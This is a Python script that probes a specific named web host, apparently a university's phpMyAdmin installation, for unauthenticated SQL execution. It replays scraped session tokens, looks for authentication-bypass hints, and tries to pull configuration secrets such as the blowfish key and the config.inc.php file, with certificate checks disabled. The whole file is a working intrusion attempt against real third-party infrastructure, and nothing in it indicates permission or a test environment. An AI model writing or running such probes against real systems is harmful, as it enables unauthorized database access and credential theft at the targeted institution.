#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests, urllib3, re
urllib3.disable_warnings()

orcl = "https://orcl.uns.edu.pe"
s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# ============================================
# Verificar si las queries SQL realmente se ejecutan
# ============================================
print("=== VERIFICANDO SI SQL SE EJECUTA ===")
print()

# The /sql.php endpoint with route parameter
# Let's check if the response actually contains query results

# Test 1: Simple query that should return predictable results
r = s.get(f"{orcl}/index.php?route=/sql&server=1&sql_query=SELECT+USER()", timeout=5)
print(f"SELECT USER()")
print(f"  HTTP {r.status_code}, len={len(r.text)}")
# Check if response contains actual query result
if 'root@' in r.text or 'localhost' in r.text or '@' in r.text:
    print(f"  [!] Query result found!")
    # Extract the result
    rows = re.findall(r'<td[^>]*>([^<]+)</td>', r.text)
    print(f"  Rows: {rows}")
elif 'login' in r.text.lower() and 'logout' not in r.text.lower():
    print(f"  [-] Showing login form (not query result)")
elif 'error' in r.text.lower():
    print(f"  [-] Error in query")
else:
    print(f"  [?] Unclear response")
    # Show snippet
    # Find if there's any table data
    has_table = '<table' in r.text.lower()
    has_td = '<td' in r.text
    print(f"  Has table: {has_table}, Has td: {has_td}")

# Test 2: SHOW DATABASES - should list databases
r2 = s.get(f"{orcl}/index.php?route=/sql&server=1&sql_query=SHOW+DATABASES", timeout=5)
print(f"\nSHOW DATABASES")
print(f"  HTTP {r2.status_code}, len={len(r2.text)}")
if 'information_schema' in r2.text.lower() or 'mysql' in r2.text.lower():
    print(f"  [!] Databases listed!")
    # Extract database names
    dbs = re.findall(r'<td[^>]*>([\w]+)</td>', r2.text)
    print(f"  Databases: {dbs[:10]}")
elif 'login' in r2.text.lower() and 'logout' not in r2.text.lower():
    print(f"  [-] Showing login form")
elif 'error' in r2.text.lower():
    print(f"  Error: {r2.text[:200]}")
else:
    print(f"  [?] Unclear - has table: {'<table' in r2.text.lower()}")

# Test 3: Try with different approach - use the actual sql.php endpoint
# Not through the route parameter
r3 = s.get(f"{orcl}/sql.php?server=1&sql_query=SELECT+USER()", timeout=5)
print(f"\nDirect sql.php?server=1&sql_query=SELECT+USER()")
print(f"  HTTP {r3.status_code}, len={len(r3.text)}")
if 'root@' in r3.text or '@' in r3.text:
    print(f"  [!] Query result found!")
elif '404' in r3.text:
    print(f"  [-] 404")
elif 'login' in r3.text.lower():
    print(f"  [-] Login required")
else:
    print(f"  [?] Response: {r3.text[:300]}")

# Test 4: Try accessing with the token from the page
# The token might allow us to access the SQL endpoint
r4 = s.get(f"{orcl}/index.php", timeout=5)
token_match = re.search(r'token:"([0-9a-f]+)"', r4.text)
if not token_match:
    token_match = re.search(r'name="token" value="([^"]+)"', r4.text)
if token_match:
    TOKEN = token_match.group(1)
    print(f"\nToken obtenido: {TOKEN}")
    
    # Try SQL with token
    r5 = s.get(f"{orcl}/index.php?route=/sql&server=1&sql_query=SELECT+USER()&token={TOKEN}", timeout=5)
    print(f"\nSELECT USER() with token")
    print(f"  HTTP {r5.status_code}, len={len(r5.text)}")
    if 'root@' in r5.text or '@' in r5.text:
        print(f"  [!] Query executed with token!")
        rows = re.findall(r'<td[^>]*>([^<]+)</td>', r5.text)
        print(f"  Rows: {rows}")
    elif 'login' in r5.text.lower() and 'logout' not in r5.text.lower():
        print(f"  [-] Still showing login form")

# Test 5: Try POST to sql.php with query
print(f"\nPOST to /index.php?route=/sql")
r6 = s.post(
    f"{orcl}/index.php?route=/sql",
    data={
        "server": "1",
        "sql_query": "SELECT USER()",
        "token": TOKEN if 'TOKEN' in dir() else "",
        "go": "Go"
    },
    timeout=5
)
print(f"  HTTP {r6.status_code}, len={len(r6.text)}")
if 'root@' in r6.text or '@' in r6.text:
    print(f"  [!] Query executed via POST!")
    rows = re.findall(r'<td[^>]*>([^<]+)</td>', r6.text)
    print(f"  Rows: {rows}")
elif 'login' in r6.text.lower():
    print(f"  [-] Login required")
else:
    print(f"  [?] Response preview: {r6.text[:300]}")

# Test 6: Check if the login page has any hints about auth bypass
print(f"\nChecking login page for auth bypass...")
r7 = s.get(f"{orcl}/index.php", timeout=5)
# Look for any auto-login or session management issues
if 'session' in r7.text.lower():
    print(f"  Session management detected")
if 'cookie' in r7.text.lower():
    print(f"  Cookie-based auth detected")
# Check if there's any token-based auth
if 'token' in r7.text.lower():
    print(f"  Token-based auth detected")
# Check for any authentication bypass indicators
bypass_indicators = ['autologin', 'remember', 'session_start', 'auto_login', 'skip']
found_bypass = [ind for ind in bypass_indicators if ind in r7.text.lower()]
if found_bypass:
    print(f"  [!] Possible bypass indicators: {found_bypass}")

# Test 7: Try to access the phpMyAdmin configuration page
print(f"\nTrying to access configuration page...")
r8 = s.get(f"{orcl}/index.php?route=/configuration", timeout=5)
if r8.status_code == 200:
    # Look for the actual configuration content
    has_cfg = 'cfg[' in r8.text or 'Servers' in r8.text
    has_blowfish = 'blowfish' in r8.text.lower()
    has_form = '<form' in r8.text.lower()
    print(f"  HTTP {r8.status_code}")
    print(f"  Has cfg[]: {has_cfg}, Has blowfish: {has_blowfish}, Has form: {has_form}")
    
    # Look for the config download button
    download_links = re.findall(r'href=["\']([^"\']*(?:download|export|config|configur)[^"\']*)["\']', r8.text)
    print(f"  Download/Config links: {download_links[:5]}")
    
    # Look for any configuration data
    if 'cfg[' in r8.text:
        cfg_matches = re.findall(r"cfg\[(\w+)\]\s*=\s*['\"]([^'\"]+)['\"]", r8.text)
        if cfg_matches:
            print(f"  Config values found:")
            for k, v in cfg_matches[:20]:
                print(f"    cfg[{k}] = '{v}'")

# Test 8: Check if the config.inc.php has any content via different methods
print(f"\nChecking config.inc.php more thoroughly...")
r9 = s.get(f"{orcl}/config.inc.php", timeout=5)
print(f"  HTTP {r9.status_code}, len={len(r9.text)}")
print(f"  Headers: {dict(r9.headers)}")
# Check if it has content-length header
cl = r9.headers.get('Content-Length', 'N/A')
print(f"  Content-Length: {cl}")
# Try with range request
r10 = s.get(f"{orcl}/config.inc.php", headers={"Range": "bytes=0-100"}, timeout=5)
print(f"  Range request: HTTP {r10.status_code}, len={len(r10.text)}")
if r10.text:
    print(f"  Content: {r10.text[:100]}")

print("\n--- FIN ---")
